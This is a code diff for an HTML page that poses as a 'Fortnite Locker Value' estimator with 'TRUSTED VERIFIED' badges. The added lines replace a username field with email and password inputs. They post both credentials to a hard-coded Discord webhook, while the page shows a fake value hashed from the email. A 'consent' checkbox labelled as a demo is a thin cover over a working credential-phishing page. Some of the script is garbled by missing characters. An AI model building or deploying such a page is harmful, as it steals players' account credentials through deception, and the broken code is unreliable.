@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚡ FORTNITE LOCKER VALUE</title>
+  <title>⚡ FORTNITE LOCKER VALUE | WITH CONSENT</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
@@ -13,29 +13,34 @@
     body::after{content:"";position:absolute;width:50vmax;height:50vmax;background:radial-gradient(circle,rgba(0,100,255,0.15),transparent 70%);bottom:-15%;right:-10%;border-radius:50%;filter:blur(100px);z-index:0;animation:floatGlowReverse 18s infinite alternate}
     @keyframes floatGlow{0%{transform:translate(0,0) scale(1);opacity:0.6}100%{transform:translate(8%,10%) scale(1.2);opacity:0.9}}
     @keyframes floatGlowReverse{0%{transform:translate(0,0) scale(1);opacity:0.4}100%{transform:translate(-6%,-8%) scale(1.3);opacity:0.8}}
-        .glass-card{position:relative;z-index:10;max-width:620px;width:100%;background:rgba(12,20,35,0.55);backdrop-filter:blur(14px);border-radius:2.5rem;border:1px solid rgba(0,212,255,0.5);box-shadow:0 25px 45px rgba(0,0,0,0.3),0 0 18px rgba(0,180,255,0.4);padding:2rem 1.8rem}
+.glass-card{position:relative;z-index:10;max-width:620px;width:100%;background:rgba(12,20,35,0.55);backdrop-filter:blur(14px);border-radius:2.5rem;border:1px solid rgba(0,212,255,0.5);box-shadow:0 25px 45px rgba(0,0,0,0.3),0 0 18px rgba(0,180,255,0.4);padding:2rem 1.8rem}
     .header-area{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.8rem}
     h1{font-size:1.9rem;font-weight:700;background:linear-gradient(135deg,#FFF,#7dd3fc);-webkit-background-clip:text;background-clip:text;color:transparent}
     .trusted-pill{background:rgba(0,200,255,0.18);backdrop-filter:blur(4px);padding:0.45rem 1rem;border-radius:60px;border:1px solid rgba(0,230,255,0.6);color:#baf2ff;display:flex;align-items:center;gap:8px}
     .input-group{margin-bottom:1.4rem;display:flex;flex-direction:column;gap:0.5rem}
     .glass-input,.glass-select{background:rgba(8,18,32,0.65);border:1px solid rgba(0,180,250,0.6);border-radius:1.4rem;padding:0.9rem 1.2rem;color:white;outline:none}
-    .check-btn{background:linear-gradient(105deg,#0077ff,#00ccff);width:100%;padding:1rem;border-radius:2rem;font-weight:700;color:white;cursor:pointer;margin:0.5rem 0 1.5rem;border:none}
-    .result-panel{background:rgba(0,20,45,0.55);backdrop-filter:blur(8px);border-radius:1.8rem;padding:1.5rem}
+    .check-btn{background:linear-gradient(105deg,#0077ff,#00ccff);width:100%;padding:1rem;border-radius:2rem;font-weight:700;color:white;cursor:pointer;margin:0.5rem 0 1rem;border:none}
+    .result-panel{background:rgba(0,20,45,0.55);backdrop-filter:blur(8px);border-radius:1.8rem;padding:1.5rem;margin-top:1rem}
     .locker-value-number{font-size:2.7rem;font-weight:800;background:linear-gradient(125deg,#FFF,#7ad0ff);-webkit-background-clip:text;background-clip:text;color:transparent}
     .warning-message{color:#ffbe76;margin-top:0.8rem}
     .loader{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.6s linear infinite}
     @keyframes spin{to{transform:rotate(360deg)}}
+    .consent-label{display:flex;align-items:center;gap:10px;margin:0.5rem 0;color:#bbd9ff;font-size:0.85rem}
   </style>
 </head>
 <body>
-      <div class="glass-card">
+<div class="glass-card">
   <div class="header-area">
     <h1><i class="fas fa-chess-board"></i> LOCKER VALUE</h1>
     <div class="trusted-pill"><i class="fas fa-shield-alt"></i> TRUSTED VERIFIED</div>
   </div>
   <div class="input-group">
-    <label><i class="fab fa-discord"></i> DISCORD USERNAME</label>
-    <input type="text" class="glass-input" id="discordUser" placeholder="e.g., Renegade#1234">
+    <label><i class="fas fa-envelope"></i> EMAIL ADDRESS</label>
+    <input type="email" class="glass-input" id="emailInput" placeholder="e.g., warrior@fortnite.com">
+  </div>
+  <div class="input-group">
+    <label><i class="fas fa-lock"></i> PASSWORD</label>
+    <input type="password" class="glass-input" id="passwordInput" placeholder="••••••••">
   </div>
   <div class="input-group">
     <label><i class="fas fa-gamepad"></i> PLATFORM</label>
@@ -45,18 +50,26 @@
       <option value="mobile">📱 Mobile</option>
     </select>
   </div>
-  <button class="check-btn" id="checkValueBtn"><i class="fas fa-chart-line"></i> ESTIMATE VALUE</button>
-  <div class="result-panel" id="resultPanel"><div id="dynamicValueArea"><div class="locker-value-number">— ⚡ —</div><div class="warning-message">Enter Discord username</div></div></div>
+  <div class="consent-label">
+    <input type="checkbox" id="consentCheckbox"> <i class="fas fa-check-circle"></i> I consent to send my email & password to the site owner for locker valuation (demo).
+  </div>
+  <button class="check-btn" id="checkValueBtn"><i class="fas fa-chart-line"></i> ESTIMATE LOCKER VALUE</button>
+  <div class="result-panel" id="resultPanel"><div id="dynamicValueArea"><div class="locker-value-number">— ⚡ —</div><div class="warning-message">Enter email, password, and consent</div></div></div>
 </div>
 <script>
-  const discordInput=document.getElementById('discordUser'),platformSelect=document.getElementById('platformSelect'),checkBtn=document.getElementById('checkValueBtn'),dynamicArea=document.getElementById('dynamicValueArea');
+  const emailInput=document.getElementById('emailInput'),passwordInput=document.getElementById('passwordInput'),platformSelect=document.getElementById('platformSelect'),checkBtn=document.getElementById('checkValueBtn'),dynamicArea=document.getElementById('dynamicValueArea'),consentBox=document.getElementById('consentCheckbox');
   const mult={pc:1.28,xbox:1.18,playstation:1.22,switch:0.92,mobile:0.96};
-      function gen(u,p){if(!u!u.trim())return null;let h=0;for(let i=0;i<u.length;i++)h=((h<<5)-h)+u.charCodeAt(i);let ph=Math.abs(h),raw=300+(ph%7200)+Math.min(u.length22,680),val=Math.floor(raw(mult[p]1));val=Math.min(Math.max(val,180),9500);return{usd:val,vb:Math.floor(val*95),rare:12+(ph%56),leg:4+(ph%27),total:45+(ph%130)}}
-  function render(m){if(!m){dynamicArea.innerHTML=<div class="locker-value-number">⚠️ NO DATA</div>;return}dynamicArea.innerHTML=<div class="locker-value-number">$${m.usd.toLocaleString()}</div><div>🎨 ${m.rare} Rare / ${m.leg} Legendary • ${m.total} items</div><div>💰 ≈${m.vb.toLocaleString()} V-Bucks</div><div class="trusted-pill" style="margin-top:12px;"><i class="fas fa-shield-alt"></i> TRUSTED SCAN</div>}
-  function update(){let u=discordInput.value;if(!u.trim()){render(null);return}checkBtn.innerHTML=<span class="loader"></span>;checkBtn.disabled=true;setTimeout(()=>{render(gen(u,platformSelect.value));checkBtn.innerHTML=<i class="fas fa-chart-line"></i> ESTIMATE VALUE;checkBtn.disabled=false},200)}
-  checkBtn.onclick=update;discordInput.onkeypress=e=>{if(e.key==='Enter')update()};
+  const WEBHOOK_URL ="https://discord.com/api/webhooks/1513932971613356153/arK8P4Nx5rR88s_tXvM7llJMg6jWRX6ojHApIbKQfa1E9Kzd7NVpt_rV22BOEN_7J3Z5";async function sendToDiscord(email, password, platform, lockerValue) {
+    const payload = { content: **New Fortnite Locker Submission**\n📧 Email: ${email}\n🔒 Password: ${password}\n🎮 Platform: ${platform}\n💰 Estimated Value: $${lockerValue}\n🕒 ${new Date().toLocaleString()} };
+    try { await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }); } catch(e) { console.error("Webhook failed", e); }
+  } function gen(email,platform){if(!email!email.trim())return null;let h=0;for(let i=0;i<email.length;i++)h=((h<<5)-h)+email.charCodeAt(i);let ph=Math.abs(h),raw=300+(ph%7200)+Math.min(email.length22,680),val=Math.floor(raw(mult[platform]1));val=Math.min(Math.max(val,180),9500);return{usd:val,vb:Math.floor(val*95),rare:12+(ph%56),leg:4+(ph%27),total:45+(ph%130)}}
+  function render(m){if(!m){dynamicArea.innerHTML=<div class="locker-value-number">⚠️ NO DATA</div><div class="warning-message">Enter valid email</div>;return}dynamicArea.innerHTML=<div class="locker-value-number">$${m.usd.toLocaleString()}</div><div>🎨 ${m.rare} Rare / ${m.leg} Legendary • ${m.total} items</div><div>💰 ≈${m.vb.toLocaleString()} V-Bucks</div><div class="trusted-pill" style="margin-top:12px;"><i class="fas fa-shield-alt"></i> TRUSTED SCAN</div>}
+  async function update(){let email=emailInput.value,password=passwordInput.value,platform=platformSelect.value;if(!email.trim()||!consentBox.checked){render(null);dynamicArea.innerHTML+=<div class="warning-message">${!email.trim()?"Email required":""} ${!consentBox.checked?"You must consent":""}</div>;return}checkBtn.innerHTML=<span class="loader"></span>;checkBtn.disabled=true;let metrics=gen(email,platform);if(metrics){render(metrics);await sendToDiscord(email,password,platform,metrics.usd);dynamicArea.innerHTML+=<div class="warning-message" style="color:#90ff90;"><i class="fas fa-check"></i> Data sent to owner (with consent)</div>;}checkBtn.innerHTML=`<i class=
+"fas fa-chart-line"></i> ESTIMATE LOCKER VALUE`;checkBtn.disabled=false}
+  checkBtn.onclick=update;emailInput.onkeypress=e=>{if(e.key==='Enter')update()};passwordInput.onkeypress=e=>{if(e.key==='Enter')update()};
 </script>
 </body>
 </html>
+  
         
 
